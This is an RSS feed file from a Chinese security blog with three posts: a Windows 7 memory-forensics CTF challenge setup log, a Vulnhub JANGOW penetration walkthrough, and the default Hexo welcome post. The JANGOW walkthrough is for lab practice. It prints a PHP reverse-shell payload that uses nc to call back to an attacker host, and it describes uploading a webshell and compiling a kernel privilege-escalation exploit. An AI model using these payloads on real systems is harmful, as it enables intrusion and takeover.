@@ -1,0 +1,125 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>MISC</title>
+        <subtitle></subtitle>
+        <icon>https://dr34nn.github.io/images/favicon.ico</icon>
+        <link>https://Dr34nn.github.io</link>
+        <author>
+          <name>Dr34m</name>
+        </author>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Wed, 06 Jul 2022 00:00:00 +0800</pubDate>
+        <lastBuildDate>Wed, 06 Jul 2022 00:00:00 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://dr34nn.github.io/2022/07/06/Windows7%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
+            <title>Windows7内存取证出题记录</title>
+            <link>https://dr34nn.github.io/2022/07/06/Windows7%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
+            <category term="MISC" scheme="https://dr34nn.github.io/categories/MISC/" />
+            <category term="取证" scheme="https://dr34nn.github.io/categories/MISC/%E5%8F%96%E8%AF%81/" />
+            <category term="出题记录" scheme="https://dr34nn.github.io/tags/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" />
+            <pubDate>Wed, 06 Jul 2022 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;最近为了准备 ISCTF 的套娃题，想起来可以外层套一个取证的皮，但是本来的环境因为电脑重装就无了，所以重新用虚拟机搭了一个 Win7 的环境，然后遇到了几个之前遇到过的问题，那个时候没有记录，导致配环境浪费了很多时间，这边就小小的记录一下吧。&lt;/p&gt;
+&lt;h3 id=&#34;写在开头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写在开头&#34;&gt;#&lt;/a&gt; 写在开头：&lt;/h3&gt;
+&lt;p&gt;win7 取证的话，内存建议开大一点，给 25g，他自身好像是占了 13g，然后一些补丁后续要加，我尝试了 20G，内存不够，25G 就足够的空间了&lt;/p&gt;
+&lt;h3 id=&#34;step1环境镜像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step1环境镜像&#34;&gt;#&lt;/a&gt; Step1: 环境镜像&lt;/h3&gt;
+&lt;p&gt;​	我使用的是 VMware 搭的虚拟机，去官网下的镜像，这边就直接放一篇博客了，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjQ5MDAxL2FydGljbGUvZGV0YWlscy8xMDU5ODkxNzMjOn46dGV4dD0lRTklOTUlOUMlRTUlODMlOEYlRTclOUElODQlRTQlQjglOEIlRTglQkQlQkQlMjAlRTclOTklQkUlRTUlQkElQTYlRTclQkQlOTElRTclOUIlOTglRTUlOUMlQjAlRTUlOUQlODAsJTI4JUU1JUI3JUIyJUU0JUI4JThCJUU4JUJEJUJEJUU1JUE1JUJEd2luZG93c3M3JTIwNjQlMjklM0ElRTklOTMlQkUlRTYlOEUlQTUlRUYlQkMlOUFodHRwcyUzQSUyRiUyRnBhbi5iYWlkdS5jb20lMkZzJTJGMWpQanFJVElfVTlmNXYzdG5pczFGLWclMjAlRTYlOEYlOTAlRTUlOEYlOTYlRTclQTAlODElRUYlQkMlOUFyYmg0&#34;&gt;参考博客&lt;/span&gt;，镜像版本选取什么应该大抵是没什么问题的，实在要参考的话，我这边选择的是这款，怎么有两款，忘了是哪款了，自己试试吧，应该是 64 位的那款。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/df339ed69054455c9386a0cfe2774bcc.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;step2sp1问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step2sp1问题&#34;&gt;#&lt;/a&gt; Step2:SP1 问题&lt;/h3&gt;
+&lt;p&gt;​	出题最主要的就是问个 SP1 问题了，为什么捏，因为我想安装 vmtools，否则我的附件以及 dump 出来的内存镜像无法从虚拟机中导出来，看了网上几篇《很老》的教程，都是千篇一律的从微软官网下载补丁，然后移进去，然后安装补丁就好了，很简单，但是他们好像忽略了一个问题，没有 vmtools，我根本移不进去啊（不知道是不是我虚拟机的问题）。凭借一个 misc 手的直觉，我最后发现了一个很好地方法，就是使用 UltraISO。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/0d0f9fddff0c407d932a90cb030c7073.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们可以把自己想要传入到虚拟机中的东西，用 Ultra 打包成 iso 镜像，然后直接丢进去。&lt;/p&gt;
+&lt;p&gt;ps: 试过插 U 盘，但是报错 U 盘无法解析&lt;/p&gt;
+&lt;h3 id=&#34;step3具体解决方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step3具体解决方法&#34;&gt;#&lt;/a&gt; Step3: 具体解决方法&lt;/h3&gt;
+&lt;h4 id=&#34;1-创建iso镜像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-创建iso镜像&#34;&gt;#&lt;/a&gt; 1、创建 ISO 镜像&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/ebaca264a0f24239ac2b0a5b90984d89.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们将自己想要移到虚拟机中的文件移动到右上方的地方，就直接点住图标拖过去就行，然后点左上角直接保存即可&lt;/p&gt;
+&lt;h4 id=&#34;2-导入镜像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-导入镜像&#34;&gt;#&lt;/a&gt; 2、导入镜像&lt;/h4&gt;
+&lt;p&gt;然后我们打开 VMware  win7 的虚拟机，导入 ISO 镜像即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/ed075b65b5b5457c986e52823ad30bb1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后就打开虚拟机就可以啦&lt;/p&gt;
+&lt;h4 id=&#34;3-打开文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-打开文件&#34;&gt;#&lt;/a&gt; 3、打开文件&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/9bafc0912ea34883a825805280ecb389.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;打开驱动&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/00cc92862c99464c9af78eec8553292e.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;将里面的内容移到桌面上就好了&lt;/p&gt;
+&lt;h3 id=&#34;step4打补丁&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step4打补丁&#34;&gt;#&lt;/a&gt; Step4: 打补丁&lt;/h3&gt;
+&lt;p&gt;这边有两个补丁要打，一个是更新程序？还有一个就是 sp1&lt;/p&gt;
+&lt;p&gt;可以自己去官网下，链接自己找，用 IDM 下很快，或者用我的百度网盘（没会员就不怪我了奥，大小 1.4G，体验 30s 应该也可以下一大部分），顺便把 dump.exe 也给啦，一个 32 位的，一个 64 位的，自己对应版本使用即可&lt;/p&gt;
+&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXI1QWNWOXo3VXhWMy1TZGpkRk5hWUE/cHdkPXl2NG0=&#34;&gt;https://pan.baidu.com/s/1r5AcV9z7UxV3-SdjdFNaYA?pwd=yv4m&lt;/span&gt;&lt;br /&gt;
+ 提取码：yv4m&lt;/p&gt;
+&lt;p&gt;然后我记得好像是先装 exe 那个？无所谓，自己都试一试，两个装完之后就可以快乐地安装 vmtools 了。&lt;/p&gt;
+&lt;h3 id=&#34;step5开始出题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step5开始出题&#34;&gt;#&lt;/a&gt; Step5: 开始出题&lt;/h3&gt;
+&lt;p&gt;我这边是设置了两个考点，一个是开机密码是 flag123456，他是以 hash 存储的，是可以解出来的。还有一个就是桌面上的文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/46ecf0a6d99546e89cced2e087f87fbc.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;把你想要的东西放在桌面上，进阶一点，你可以在你的命令行里打一些命令，或者在你的剪切板，ie 浏览器里访问一些网站，这些就靠你自己去尝试啦。最后运行 dumpit.exe 就好了，直接拖到终端运行即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/3df1c2b4048f42a98b5388b592d608a9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后按下 y，一个题目就出好咯，可以去欺负小新生了，下班！&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://dr34nn.github.io/2022/07/06/vulnhub-JANGOW/</guid>
+            <title>JANGOW</title>
+            <link>https://dr34nn.github.io/2022/07/06/vulnhub-JANGOW/</link>
+            <category term="内网" scheme="https://dr34nn.github.io/categories/%E5%86%85%E7%BD%91/" />
+            <category term="vulnhub" scheme="https://dr34nn.github.io/tags/vulnhub/" />
+            <pubDate>Wed, 06 Jul 2022 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;首先配置一下虚拟机，因为 ova 格式用 VM 导入的话，是不显示 ip 的，具体配置网上都有，这里就不说了&lt;/p&gt;
+&lt;p&gt;配置成功后，在本机上使用 arp-scan -l 就可以看到靶机 ip (用来验证是否配置成功)&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/6f19y7LDuT8KMZQ.png&#34; alt=&#34;image-20220706180938973&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;端口扫描&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/D5f1rEh8AxVond2.png&#34; alt=&#34;image-20220706173442839&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;开放了 80 端口，所以直接访问看看，点点点，就发现可疑接口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/oSWHbsaAE8YtzDc.png&#34; alt=&#34;image-20220706173524813&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;写个一句话木马传上去，蚁剑连&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/XeMdtG5NIQZiV4F.png&#34; alt=&#34;image-20220706173618962&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;再 WordPress 下面发现配置文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/Uo3f9mk6wqplRa8.png&#34; alt=&#34;image-20220706173707830&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在 /var/www/html 下有个.backup 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/mVCSTAijWdMaODt.png&#34; alt=&#34;image-20220706173832888&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后尝试登录系统，但是并没有发现什么有用的东西，先写个反弹 shell 吧&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/UKu5WPpTQcYaJ2i.png&#34; alt=&#34;image-20220706174421828&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php system(&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.248.129 443 &amp;gt;/tmp/f&amp;quot;);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/KUhCFndli5TceAI.png&#34; alt=&#34;image-20220706175349190&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;kali 本地监听 443 端口，浏览器访问刚才创建的反弹 shell 的文件 2.php&lt;br /&gt;
+ 出现下图界面即为反弹成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/DwHCPnhxFMty9Tk.png&#34; alt=&#34;image-20220706175448414&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;升级 tty shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/c9E5eHlkqLiSswC.png&#34; alt=&#34;image-20220706175721981&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看一下内核版本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/9bwqlPt4vmXZGQH.png&#34; alt=&#34;image-20220706175824793&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在 kali 里找一下有没有该版本的漏洞信息，果然发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/itW6IpjKSJ2dcXu.png&#34; alt=&#34;image-20220706175910491&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用命令，把 &lt;code&gt;.c&lt;/code&gt;  文件下下来，然后直接在本地 &lt;code&gt;gcc 45010.c -o exp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/q8GlWNxzikMnAmH.png&#34; alt=&#34;image-20220706180048930&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;编译完成以后我们通过 ftp 服务上传到靶机中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/Cx4izEsfWOLHtIZ.png&#34; alt=&#34;image-20220706180304820&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;再回到靶机那边，给 exp 权限，最后提权成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/SwEB1lrnDcF9KO7.png&#34; alt=&#34;image-20220706180656881&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;进入 root 目录下，发现第二个 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/mobxRfqedOJH6hY.png&#34; alt=&#34;image-20220706180751632&#34; /&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://dr34nn.github.io/2022/07/05/hello-world/</guid>
+            <title>Hello World</title>
+            <link>https://dr34nn.github.io/2022/07/05/hello-world/</link>
+            <pubDate>Tue, 05 Jul 2022 16:03:35 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
+&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo new &lt;span class=&#34;token string&#34;&gt;&#34;My New Post&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo server&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo generate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
